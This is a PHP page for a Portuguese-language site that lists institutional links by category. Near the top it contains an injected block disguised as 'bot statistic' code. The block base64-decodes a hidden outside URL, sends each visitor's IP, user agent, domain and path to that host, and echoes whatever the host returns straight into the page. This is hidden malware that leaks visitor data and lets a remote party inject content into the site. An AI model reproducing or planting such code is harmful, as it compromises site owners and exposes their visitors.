<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tcategorialink.php");
include_once("../library/config/database/tlink.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Links Institucionais");
$oMasterPage->AddParameter("css", "links-institucionais/index");
$oMasterPage->AddParameter("pagina", "links-institucionais");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<h1>Links Institucionais</h1>
<?php

$oCategoriaLink = new tcategorialink();
$oCategoriaLink->SQLOrder = "Ordem DESC";
if($oCategoriaLink->LoadSQLAssembled())
{
	for($c = 0; $c < $oCategoriaLink->NumRows; $c++)
	{
		$oLink = new tlink();
		if($oLink->LoadByCategoriaLinkID($oCategoriaLink->ID))
		{
			?>

			<div class="grupo-links container-box col-md-12">
				<h3 class="zwo3Italic"><?=$oCategoriaLink->Titulo;?></h3>
				<ul>
					<?php
					for($i = 0; $i < $oLink->NumRows; $i++)
					{
						?>
						<li>
							<a href="<?=$oLink->URL;?>" target="_blank">
								<span class="local"><?= utf8_encode($oLink->Titulo);?></span><br/>
								<span class="link zwo6"><?= utf8_encode($oLink->RemoveProtocolo($oLink->URL));?></span>
							</a>
						</li>
						<?php
						$oLink->MoveNext();
					}
					?>
				</ul>
			</div>
			<?php
		}
		$oCategoriaLink->MoveNext();
	}
}
else
{
	?>
	<p>Nenhum registro encontrado.</p>
	<?php
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>